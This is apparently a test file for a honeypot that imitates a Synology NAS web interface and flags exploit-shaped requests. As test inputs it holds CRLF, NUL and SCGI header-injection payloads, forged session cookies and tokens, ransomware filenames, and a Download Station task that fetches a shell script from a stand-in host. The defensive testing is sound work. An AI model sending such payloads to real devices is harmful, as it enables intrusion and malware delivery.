"""Every flag, with a positive and a negative case, and the CVE hint rules."""

from __future__ import annotations

from conftest import Harness


async def flags_of(h: Harness, path: str = "", *, last: bool = True) -> tuple[list[str], dict]:  # type: ignore[type-arg]
    evs = [e for e in await h.events("http_request")]
    d = evs[-1].data
    return d["flags"], d


async def get(h: Harness, path: str, headers: dict[str, str] | None = None) -> None:
    await h.http("GET", path, headers=headers)


async def test_plain_request_has_no_exploit_flags(harness: Harness) -> None:
    await get(harness, "/")
    flags, d = await flags_of(harness)
    assert flags == []
    assert "cve" not in d and d["dsm_version"] == "7.2.1-69057-11"
    assert d["api"] == "" and d["tls"] is False and d["body_len"] == 0


async def test_dsm_api_flag(harness: Harness) -> None:
    await get(harness, "/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info")
    flags, d = await flags_of(harness)
    assert "dsm_api" in flags and "dsm_version_probe" in flags
    assert (d["api"], d["api_method"], d["api_version"]) == ("SYNO.Core.System", "info", "1")
    await get(harness, "/webman/index.cgi")
    flags, _ = await flags_of(harness)
    assert "dsm_api" not in flags


async def test_dsm_login_flag(harness: Harness) -> None:
    await harness.form(
        "/webapi/entry.cgi", "api=SYNO.API.Auth&version=7&method=login&account=a&passwd=b"
    )
    flags, _ = await flags_of(harness)
    assert "dsm_login" in flags and "sid_forge" not in flags
    await harness.form("/webapi/entry.cgi", "api=SYNO.API.Auth&version=7&method=logout")
    flags, _ = await flags_of(harness)
    assert "dsm_login" not in flags


async def test_dsm_version_probe_flag(harness: Harness) -> None:
    for path in (
        "/webapi/query.cgi?api=SYNO.API.Info&version=1&method=query&query=all",
        "/webapi/entry.cgi?api=SYNO.DSM.Info&version=2&method=getinfo",
        "/webman/info.cgi",
    ):
        await get(harness, path)
        flags, _ = await flags_of(harness)
        assert "dsm_version_probe" in flags, path
    await get(harness, "/webapi/entry.cgi?api=SYNO.FileStation.List&version=2&method=list_share")
    flags, _ = await flags_of(harness)
    assert "dsm_version_probe" not in flags


async def test_sid_forge_flag_and_cve(harness: Harness) -> None:
    cases = [
        ("/webapi/entry.cgi?api=SYNO.FileStation.List&version=2&method=list&_sid=abcd", {}),
        ("/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info", {"Cookie": "id=AAAA"}),
        ("/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info", {"X-SYNO-TOKEN": "t0k"}),
        ("/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info&SynoToken=zz", {}),
    ]
    for path, headers in cases:
        await get(harness, path, headers)
        flags, d = await flags_of(harness)
        assert "sid_forge" in flags, (path, headers)
        assert d["cve"] == ["CVE-2026-13639", "CVE-2026-13684"]


async def test_sid_forge_negative(harness: Harness) -> None:
    await get(harness, "/", {"Cookie": "did=abc; lang=enu"})
    flags, d = await flags_of(harness)
    assert "sid_forge" not in flags and "cve" not in d
    await harness.form(
        "/webapi/entry.cgi", "api=SYNO.API.Auth&version=7&method=login&account=admin&passwd=x"
    )
    flags, _ = await flags_of(harness)
    assert "sid_forge" not in flags
    # a login with an account and no password is an ordinary (failed) login, not a forged session
    await harness.form(
        "/webapi/entry.cgi", "api=SYNO.API.Auth&version=7&method=login&account=admin"
    )
    flags, d = await flags_of(harness)
    assert "dsm_login" in flags and "sid_forge" not in flags and "cve" not in d
    # a session id or cookie on an ordinary page (not a DSM web API call) is not an exploit shape
    for path, headers in (
        ("/?_sid=abcd", {}),
        ("/webman/index.cgi", {"Cookie": "id=AAAA"}),
        ("/index.html?sid=1", {"X-SYNO-TOKEN": "t0k"}),
    ):
        await get(harness, path, headers)
        flags, d = await flags_of(harness)
        assert "sid_forge" not in flags and "cve" not in d, path


async def test_scgi_injection_positive(harness: Harness) -> None:
    base = "/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info&x="
    payloads = [
        "a%0d%0aContent-Length:%200",  # CRLF
        "a%00b",  # NUL
        "a%01b",  # other control byte
        "CONTENT_LENGTH%20123",  # SCGI variable name
        "Set-Cookie:%20id=1",  # header-like
        "17:CONTENT_LENGTH%00",  # netstring framing
        "a%250d%250ab",  # double encoded
    ]
    for p in payloads:
        await get(harness, base + p)
        flags, d = await flags_of(harness)
        assert "scgi_injection" in flags, p
        assert d["cve"] == ["CVE-2026-13639", "CVE-2026-13684"]


async def test_scgi_injection_in_form_and_header(harness: Harness) -> None:
    await harness.form(
        "/webapi/entry.cgi", "api=SYNO.Core.System&version=1&method=info&q=a%0d%0aHost:%20x"
    )
    flags, _ = await flags_of(harness)
    assert "scgi_injection" in flags
    await get(harness, "/", {"X-Custom": "a\x00b"})
    flags, _ = await flags_of(harness)
    assert "scgi_injection" in flags


async def test_scgi_injection_negative(harness: Harness) -> None:
    for q in ("x=12:30", "x=hello%20world", "x=http://203.0.113.5/a?b=c", "x=Note:%20hi", "x=3:4"):
        await get(harness, "/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info&" + q)
        flags, d = await flags_of(harness)
        assert "scgi_injection" not in flags, q
        assert "cve" not in d


async def test_file_write_flag(harness: Harness) -> None:
    positives = [
        ("SYNO.FileStation.Upload", "upload"),
        ("SYNO.FileStation.Rename", "rename"),
        ("SYNO.FileStation.Delete", "start"),
        ("SYNO.FileStation.CopyMove", "start"),
        ("SYNO.FileStation.Compress", "start"),
        ("SYNO.FileStation.CreateFolder", "create"),
        ("SYNO.Core.TaskScheduler", "create"),
        ("SYNO.Core.Package.Installation", "install"),
    ]
    for api, method in positives:
        await get(harness, f"/webapi/entry.cgi?api={api}&version=1&method={method}")
        flags, d = await flags_of(harness)
        assert "file_write" in flags, api
        assert "cve" not in d  # file_write alone is not a CVE-shaped flag
    for api, method in [
        ("SYNO.FileStation.List", "list"),
        ("SYNO.FileStation.Delete", "status"),
        ("SYNO.Core.TaskScheduler", "list"),
        ("SYNO.Core.Package", "list"),
    ]:
        await get(harness, f"/webapi/entry.cgi?api={api}&version=1&method={method}")
        flags, _ = await flags_of(harness)
        assert "file_write" not in flags, api


async def test_multipart_upload_recorded(harness: Harness) -> None:
    boundary = "----b0und"
    body = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="api"\r\n\r\nSYNO.FileStation.Upload\r\n'
        f'--{boundary}\r\nContent-Disposition: form-data; name="method"\r\n\r\nupload\r\n'
        f'--{boundary}\r\nContent-Disposition: form-data; name="version"\r\n\r\n2\r\n'
        f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="read-me3.txt"\r\n'
        "Content-Type: text/plain\r\n\r\nPay up\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    await harness.http(
        "POST",
        "/webapi/entry.cgi",
        body,
        {"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    flags, d = await flags_of(harness)
    assert {"file_write", "ransom_indicator", "dsm_api"} <= set(flags)
    assert d["api"] == "SYNO.FileStation.Upload" and d["upload_names"] == ["read-me3.txt"]


async def test_ransom_indicator(harness: Harness) -> None:
    for path in (
        "/webapi/entry.cgi?api=SYNO.FileStation.Rename&version=2&method=rename&name=a.doc.L0CK3D",
        "/read-me3.txt",
    ):
        await get(harness, path)
        flags, _ = await flags_of(harness)
        assert "ransom_indicator" in flags, path
    await harness.form(
        "/webapi/entry.cgi", "api=SYNO.FileStation.Delete&path=%2Fvolume1%2Fx.L0CK3D"
    )
    flags, _ = await flags_of(harness)
    assert "ransom_indicator" in flags
    await get(harness, "/webapi/entry.cgi?api=SYNO.FileStation.Rename&name=notes.txt")
    flags, _ = await flags_of(harness)
    assert "ransom_indicator" not in flags


async def test_no_user_agent_flag(harness: Harness) -> None:
    await harness.raw(b"GET / HTTP/1.1\r\nHost: a\r\nConnection: close\r\n\r\n")
    flags, _ = await flags_of(harness)
    assert "no_user_agent" in flags
    await get(harness, "/")
    flags, _ = await flags_of(harness)
    assert "no_user_agent" not in flags


async def test_oversized_body_flag(harness: Harness) -> None:
    big = b"a=" + b"x" * (harness.cfg.body_cap + 10)
    await harness.form("/webapi/entry.cgi", big.decode())
    flags, d = await flags_of(harness)
    assert "oversized_body" in flags and d["body_truncated"] is True
    assert len(d["body_preview"]) <= 4096


async def test_download_attempt_from_download_station(harness: Harness) -> None:
    await harness.form(
        "/webapi/DownloadStation/task.cgi",
        "api=SYNO.DownloadStation.Task&version=1&method=create&uri=http%3A%2F%2F203.0.113.9%2Fm.sh",
    )
    evs = await harness.events("download_attempt")
    assert len(evs) == 1
    d = evs[0].data
    assert d["url"] == "http://203.0.113.9/m.sh" and d["tool"] == "download_station"
    assert d["param"] == "uri" and d["api"] == "SYNO.DownloadStation.Task"
    await harness.form(
        "/webapi/entry.cgi",
        "api=SYNO.DownloadStation2.Task&version=2&method=create&url=%5B%22ftp%3A%2F%2F198.51.100.4%2Fa%22%5D",
    )
    evs = await harness.events("download_attempt")
    assert evs[-1].data["url"] == "ftp://198.51.100.4/a"


async def test_no_download_for_plain_requests(harness: Harness) -> None:
    await get(harness, "/?next=http://203.0.113.9/x")
    await get(harness, "/webapi/entry.cgi?api=SYNO.Core.System&version=1&method=info&x=nothing")
    assert await harness.events("download_attempt") == []
